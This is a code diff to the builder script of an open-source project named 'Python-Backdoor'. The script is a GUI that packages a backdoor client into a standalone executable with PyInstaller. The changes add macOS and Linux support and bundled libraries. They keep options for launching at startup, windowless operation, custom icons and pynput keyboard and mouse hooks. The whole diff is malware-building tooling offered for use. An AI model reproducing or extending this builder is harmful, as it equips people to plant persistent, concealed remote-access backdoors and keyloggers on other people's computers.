@@ -5,7 +5,8 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import platform
+import shutil
+import ssl
 import threading
 from tkinter import *
 from tkinter.ttk import *
@@ -19,6 +20,12 @@ import socket
 import sys
 import urllib.request
 import site
+import certifi
+
+# append path, needed for all 'main' files
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
+
+from src.definitions import platforms
 
 
 def null_callback():
@@ -29,33 +36,45 @@ def get_local_ip():
     try:
         # create a dummy socket to get local IP address
         _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        _socket.connect(("google.com", 0))
+        _socket.connect(("8.8.8.8", 80))
         ip = _socket.getsockname()[0]
         _socket.close()
-    except socket.error:
-        tkinter.messagebox.showerror("Error", "You are not connected to the internet")
+    except socket.error as e:
+        tkinter.messagebox.showerror("Error", f"You are not connected to the internet: {e}")
         sys.exit(0)
 
     return ip
 
 
+def get_external_ip():
+    _request = urllib.request.urlopen("https://ident.me", context=ssl.create_default_context(cafile=certifi.where()))
+    return _request.read().decode("utf-8")
+
+
 def get_pyinstaller():
-    user_path = site.getusersitepackages().split("\\")[:-1]
-    user_path = "\\".join(user_path)
+    # if unix, pyinstaller should be available globally
+    if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
+        if shutil.which("pyinstaller") != "":
+            return "pyinstaller"
+        else:
+            tkinter.messagebox.showerror("Error", "Pyinstaller not found in path")
+    else:
+        user_path = site.getusersitepackages().split("\\")[:-1]
+        user_path = "\\".join(user_path)
 
-    for path in site.getsitepackages() + [site.getusersitepackages(), user_path]:
-        _path = f"{path}\\Scripts\\pyinstaller.exe"
-        if os.path.isfile(_path):
-            return "\"" + _path + "\""
+        for path in site.getsitepackages() + [site.getusersitepackages(), user_path]:
+            _path = f"{path}\\Scripts\\pyinstaller.exe"
+            if os.path.isfile(_path):
+                return "\"" + _path + "\""
 
-    tkinter.messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
+        tkinter.messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
+
     sys.exit(0)
 
 
 def save_files(client_args):
-    client_new_line = f"if __name__ == \"__main__\": \n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"
-
     main_match = "if __name__ == \"__main__\":"
+    client_new_line = f"{main_match}\n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"
 
     file = open("main_client.py", "r")
     file_contents = file.readlines()
@@ -74,22 +93,15 @@ def save_files(client_args):
     file.close()
 
 
-def check_windows():
-    if not "windows" in platform.system().lower():
-        tkinter.messagebox.showerror("Error", "You need a windows computer to build the client")
-        sys.exit(0)
-
-
 class Setup:
     def __init__(self):
 
         os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
-        check_windows()
 
         self.pyinstaller = get_pyinstaller()
 
         self.local_ip = get_local_ip()
-        self.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+        self.external_ip = get_external_ip()
         self.loopback_ip = "127.0.0.1"
         self.host = self.local_ip
 
@@ -109,7 +121,6 @@ class Setup:
         # dummy value
         self.root_log = Label()
 
-        self.root.geometry("360x235")
         self.root.resizable(0, 0)
         self.root.title("Python backdoor setup")
 
@@ -141,7 +152,7 @@ class Setup:
         self.misc_frame = LabelFrame(self.frame, text="Misc.")
         self.misc_frame.pack(side=LEFT)
 
-        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup", variable=self.add_startup)
+        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup on launch", variable=self.add_startup)
         self.startup_cb.grid(column=0, row=0, sticky=W)
 
         self.add_icon_cb = Checkbutton(self.misc_frame, text="Custom icon", variable=self.icon,
@@ -154,13 +165,22 @@ class Setup:
         self.console_cb = Checkbutton(self.misc_frame, text="Console app", variable=self.is_console)
         self.console_cb.grid(column=0, row=4, sticky=W)
 
-        self.debug_cb = Checkbutton(self.misc_frame, text="Pyinstaller debug", variable=self.is_debug, command=self.debug_cb_callback)
+        self.debug_cb = Checkbutton(self.misc_frame, text="Pyinstaller debug", variable=self.is_debug,
+                                    command=self.debug_cb_callback)
         self.debug_cb.grid(column=0, row=5, sticky=W)
 
         self.build_btn = Button(self.frame, text="Build", width=36, command=self.build_btn_callback)
         self.build_btn.pack(padx=8, side=BOTTOM, anchor=W)
 
+        self.update_for_os()
         self.root.mainloop()
+
+    def update_for_os(self):
+        if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
+            self.add_startup.set(0)
+            self.startup_cb.config(state=DISABLED)
+            self.melt.set(0)
+            self.melt_cb.config(state=DISABLED)
 
     def default_build_ui_state(self):
         self.root.protocol("WM_DELETE_WINDOW", self.root.destroy)
@@ -219,7 +239,18 @@ class Setup:
             icon_command = f"--icon {self.icon_path}" if self.icon_path else ""
             debug_command = "--debug=all --log-level DEBUG" if bool(self.is_debug.get()) else ""
 
-            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} --onefile -y " \
+            libs = ""
+            # add all libraries, currently there are only linux ones
+            if platforms.OS == platforms.LINUX:
+                libdir = os.path.abspath(
+                    os.path.join(os.path.dirname(os.path.abspath(__file__)), os.pardir)) + "/lib/linux"
+
+                for file in os.listdir(libdir):
+                    _file = os.path.join(libdir, file)
+                    if os.path.isfile(_file):
+                        libs += f"--add-data \"{_file}:/lib/linux\" "
+
+            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} {libs} --onefile -y " \
                           f"--clean --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 " \
                           f"--exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter " \
                           f"--exclude-module tkinter --exclude-module Tkinter "
